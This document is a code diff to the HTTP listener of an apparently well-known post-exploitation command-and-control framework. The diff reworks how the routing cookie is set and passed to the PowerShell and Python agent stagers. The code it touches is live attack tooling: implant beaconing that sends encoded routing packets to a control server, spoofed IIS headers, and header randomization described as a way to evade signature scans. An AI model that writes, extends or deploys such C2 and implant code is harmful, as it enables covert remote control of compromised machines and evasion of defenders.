@@ -106,15 +106,15 @@ class Listener:
                 'Description'   :   'Hours for the agent to operate (09:00-17:00).',
                 'Required'      :   False,
                 'Value'         :   ''
-            },
+            },          
             'Headers' : {
                 'Description'   :   'Headers for the control server.',
                 'Required'      :   True,
                 'Value'         :   'Server:Microsoft-IIS/7.5'
             },
             'Cookie' : {
-                'Description'   :   'Custom Cookie Name',
-                'Required'      :   False,
+                'Description'   :   'Custom Cookie Name.',
+                'Required'      :   True,
                 'Value'         :   ''
             },
             'StagerURI' : {
@@ -163,11 +163,9 @@ class Listener:
         # randomize the length of the default_response and index_page headers to evade signature based scans
         self.header_offset = random.randint(0, 64)
 
-        self.session_cookie = ''
-
-        # check if the current session cookie not empty and then generate random cookie
-        if self.session_cookie == '':
+        if self.options['Cookie']['Value'] == '':
             self.options['Cookie']['Value'] = self.generate_cookie()
+              
 
     def default_response(self):
         """
@@ -284,14 +282,7 @@ class Listener:
             uris = [a for a in profile.split('|')[0].split(',')]
             stage0 = random.choice(uris)
             customHeaders = profile.split('|')[2:]
-
-            cookie = listenerOptions['Cookie']['Value']
-
-            # generate new cookie if the current session cookie is empty to avoid empty cookie if create multiple listeners
-            if cookie == '':
-                generate = self.generate_cookie()
-                listenerOptions['Cookie']['Value'] = generate
-                cookie = generate
+            cookie  = listenerOptions['Cookie']['Value']
 
             if language.startswith('po'):
                 # PowerShell
@@ -574,15 +565,8 @@ class Listener:
                 host += "/"
 
             #Patch in custom Headers
-            remove = []
             if customHeaders != []:
-                for key in customHeaders:
-                    value = key.split(":")
-                    if 'cookie' in value[0].lower() and value[1]:
-                        continue
-                    remove += value
-                headers = ','.join(remove)
-                #headers = ','.join(customHeaders)
+                headers = ','.join(customHeaders)
                 stager = stager.replace("$customHeaders = \"\";","$customHeaders = \""+headers+"\";")
 
             #patch in working hours, if any
@@ -656,7 +640,6 @@ class Listener:
         else:
             print helpers.color("[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
 
-
     def generate_agent(self, listenerOptions, language=None, obfuscate=False, obfuscationCommand=""):
         """
         Generate the full agent code needed for communications with this listener.
@@ -673,6 +656,7 @@ class Listener:
         lostLimit = listenerOptions['DefaultLostLimit']['Value']
         killDate = listenerOptions['KillDate']['Value']
         workingHours = listenerOptions['WorkingHours']['Value']
+        cookie = listenerOptions['Cookie']['Value']
         b64DefaultResponse = base64.b64encode(self.default_response())
 
         if language == 'powershell':
@@ -682,7 +666,7 @@ class Listener:
             f.close()
 
             # patch in the comms methods
-            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
+            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language, cookie=cookie)
             code = code.replace('REPLACE_COMMS', commsCode)
 
             # strip out comments and blank lines
@@ -708,7 +692,7 @@ class Listener:
             f.close()
 
             # patch in the comms methods
-            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
+            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language, cookie=cookie)
             code = code.replace('REPLACE_COMMS', commsCode)
 
             # strip out comments and blank lines
@@ -730,9 +714,8 @@ class Listener:
             return code
         else:
             print helpers.color("[!] listeners/http generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
-
-
-    def generate_comms(self, listenerOptions, language=None):
+            
+    def generate_comms(self, listenerOptions, language=None, cookie=''):
         """
         Generate just the agent communication code block needed for communications with this listener.
 
@@ -772,7 +755,7 @@ class Listener:
 
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$script:UserAgent)
                                 $script:Headers.GetEnumerator() | % {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
-                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("Cookie",\"""" + self.session_cookie + """=$RoutingCookie")
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("Cookie",\"""" + cookie + """=$RoutingCookie")
 
                                 # choose a random valid URI for checkin
                                 $taskURI = $script:TaskURIs | Get-Random
@@ -864,7 +847,7 @@ def send_message(packets=None):
         #   meta TASKING_REQUEST = 4
         routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
         b64routingPacket = base64.b64encode(routingPacket)
-        headers['Cookie'] = \"""" + self.session_cookie + """=%s" % (b64routingPacket)
+        headers['Cookie'] = \"""" + cookie + """=%s" % (b64routingPacket)
 
     taskURI = random.sample(taskURIs, 1)[0]
     requestUri = server + taskURI
@@ -995,7 +978,8 @@ def send_message(packets=None):
 
             This is used during the first step of the staging process,
             and when the agent requests taskings.
-            """
+            """         
+
             clientIP = request.remote_addr
 
             listenerName = self.options['Name']['Value']
@@ -1013,20 +997,22 @@ def send_message(packets=None):
                 try:
                     # see if we can extract the 'routing packet' from the specified cookie location
                     # NOTE: this can be easily moved to a paramter, another cookie value, etc.
-                    if self.session_cookie in cookie:
-                        listenerName = self.options['Name']['Value']
-                        message = "[*] GET cookie value from {} : {}".format(clientIP, cookie)
-                        signal = json.dumps({
-                            'print': False,
-                            'message': message
-                        })
-                        dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
-                        cookieParts = cookie.split(';')
-                        for part in cookieParts:
-                            if part.startswith(self.session_cookie):
-                                base64RoutingPacket = part[part.find('=')+1:]
-                                # decode the routing packet base64 value in the cookie
-                                routingPacket = base64.b64decode(base64RoutingPacket)
+                    cookies = helpers.get_listener_cookies()
+                    for session in cookies:
+                        if session in cookie:
+                            listenerName = self.options['Name']['Value']
+                            message = "[*] GET cookie value from {} : {}".format(clientIP, cookie)
+                            signal = json.dumps({
+                                'print': False,
+                                'message': message
+                            })
+                            dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
+                            cookieParts = cookie.split(';')
+                            for part in cookieParts:
+                                if part.startswith(session):
+                                    base64RoutingPacket = part[part.find('=')+1:]
+                                    # decode the routing packet base64 value in the cookie
+                                    routingPacket = base64.b64decode(base64RoutingPacket)
                 except Exception as e:
                     routingPacket = None
                     pass
@@ -1091,7 +1077,7 @@ def send_message(packets=None):
                     'message': message
                 })
                 dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
-                return make_response(self.default_response(), 200)
+                return make_response(self.default_response(), 200)    
 
         @app.route('/<path:request_uri>', methods=['POST'])
         def handle_post(request_uri):
